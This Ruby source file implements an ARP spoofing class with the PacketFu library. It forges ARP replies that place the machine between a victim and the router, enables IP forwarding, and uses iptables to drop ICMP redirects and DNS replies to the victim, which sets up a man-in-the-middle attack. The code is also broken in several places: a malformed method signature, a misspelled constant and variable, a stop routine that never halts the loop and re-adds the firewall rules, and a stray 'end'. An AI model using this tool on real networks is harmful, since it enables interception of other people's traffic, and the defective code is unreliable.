#!/usr/bin/env ruby

require 'rubygems'
require 'packetfu'


class ARPSpoof

    #add your iface
    def initialize(victim_ip, victim_mac, gateway, router_mac iface="" spoof=false)
        @victim_ip = victim_ip
        cfg = PACKETFu::Utils.whoami?(:iface => iface)

        @victim_packet = PacketFu::ARPPacket.new
        @router_packet = PacketFu::ARPPacket.new
        @iface = iface

        @victim_packet.eth_saddr = cfg[:eth_saddr]            # our MAC address
        @victim_packet.eth_daddr = victim_mac                 # the victim's MAC address
        @victim_packet.arp_saddr_mac = cfg[:eth_saddr]        # our MAC address
        @victim_packet.arp_daddr_mac = victim_mac             # the victim's MAC address
        @victim_packet.arp_saddr_ip = gateway                 # the router's IP
        @victim_packet.arp_daddr_ip = victim_ip               # the victim's IP
        @victim_packet.arp_opcode = 2                         # arp code 2 == ARP reply

        # Make the router packet
        @router_packet.eth_saddr = cfg[:eth_saddr]            # our MAC address
        @router_packet.eth_daddr = router_mac                 # the router's MAC address
        @router_packet.arp_saddr_mac = cfg[:eth_saddr]        # our MAC address
        @router_packet.arp_daddr_mac = router_mac             # the router's MAC address
        @router_packet.arp_saddr_ip = victim_ip               # the victim's IP
        @router_packet.arp_daddr_ip = gateway                 # the router's IP
        @router_packet.arp_opcode = 2                         # arp code 2 == ARP reply

        if spoot then
          poison
        end

    end

    def send(packet, interface)
      packet.to_w(interface)
    end #send packet, interface


    def poison
      puts "ARP Poisoning Starting.. \n"
      if @running then
        puts "Already running another instance of ARP Poisoning"
        return
      end
      @running = true

      `echo 1 > /proc/sys/net/ipv4/ip_forward`

      `iptables -A OUTPUT -p ICMP --icmp-type 5 -d #{@victim_ip} -j DROP`
      `iptables -A FORWARD -p udp --sport 53 -d #{@victim_ip} -j DROP`

      while(@running)
        sleep 1 
        send(@victim_packet, @iface)
        send(@router_packet, @iface)

      end
    end

    def stop
      running = false
      
      `echo 0 > /proc/sys/net/ipv4/ip_forward`
    
      `iptables -A OUTPUT -p ICMP --icmp-type 5 -d #{@victim_ip} -j DROP`
      `iptables -A FORWARD -p udp --sport 53 -d #{@victim_ip} -j DROP`

      end
end





